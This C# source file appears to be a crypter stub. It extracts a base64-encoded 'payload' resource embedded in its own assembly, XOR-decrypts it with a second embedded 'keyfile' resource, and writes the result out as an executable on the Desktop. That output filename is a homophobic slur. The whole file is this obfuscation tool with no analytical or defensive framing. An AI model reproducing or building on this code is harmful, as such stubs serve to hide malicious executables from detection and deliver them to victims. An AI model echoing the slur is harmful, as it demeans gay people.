using System;
using System.IO;
using System.Reflection;

namespace Stub
{
    class MyClass
    {
        static void Main(string[] args)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            byte[] file = getExeFile(asm);
            Console.WriteLine(BitConverter.ToString(file, 0, 2));
            byte[] key = getKeyFile(asm);
            Console.WriteLine(BitConverter.ToString(key, 0, 2));
            xor(file, key);
            Console.WriteLine(BitConverter.ToString(file, 0, 2));
            File.WriteAllBytes("C:\\Users\\Admin\\Desktop\\Faggot.exe",
                                file);
        }



        static byte[] getKeyFile(Assembly o)
        {
            byte[] b = null;

            using (Stream stream = o.GetManifestResourceStream("keyfile"))
            {
                using (BinaryReader rdr = new BinaryReader(stream))
                {
                    b = rdr.ReadBytes((int)stream.Length);
                }
            }

            return b;
        }

        static byte[] getExeFile(Assembly o)
        {
            byte[] b = null;

            using (Stream stream = o.GetManifestResourceStream("payload"))
            {
                using (StreamReader rdr = new StreamReader(stream))
                {
                    b = Convert.FromBase64String(rdr.ReadToEnd());
                }
            }

            return b;
        }

        static void xor(byte[] input, byte[] key)
        {
            for (int i = 0; i < input.Length; i++)
                input[i] ^= key[i % key.Length];
        }

    }
}
